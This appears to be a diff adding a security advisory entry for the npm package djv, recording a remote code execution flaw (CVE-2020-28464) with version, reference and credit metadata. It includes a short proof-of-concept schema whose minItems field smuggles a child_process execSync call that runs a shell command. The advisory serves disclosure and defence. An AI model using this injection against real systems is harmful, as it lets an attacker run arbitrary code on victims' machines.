@@ -1,0 +1,39 @@
+---
+- id: snykio:npm:djv:1014545
+  title: Remote Code Execution (RCE)
+  description: |
+    [djv][1] is a dynamic json-schema validator
+
+    Affected versions of this package are vulnerable to Remote Code
+    Execution (RCE). By controlling the schema file, an attacker can run
+    arbitrary JavaScript code on the victim machine.
+
+    ### POC:   {#poc}
+
+        const djv = require('djv');
+        const env = new djv();
+        const evilSchema = JSON.parse('{"common":{"type":"array", "minItems":"process.mainModule.require(`child_process`).execSync(`touch HACKED`)"}}')
+        env.addSchema('test', evilSchema);
+        env.validate('test#/common', { type: 'custom' });
+
+
+
+    [1]: https://www.npmjs.com/package/djv
+  affected_package: djv
+  vulnerable_versions:
+  - "<2.1.4"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-28464
+  cwe:
+  - CWE-94
+  disclosed_date: 2020-09-30
+  created_date: 2021-01-04
+  last_modified_date: 2021-01-04
+  credit:
+  - Alessio Della Libera (d3lla)
+  references:
+  - https://github.com/korzio/djv/blob/master/lib/utils/properties.js#L55
+  - https://github.com/korzio/djv/pull/98/files
+  source_url: https://snyk.io/vuln/SNYK-JS-DJV-1014545
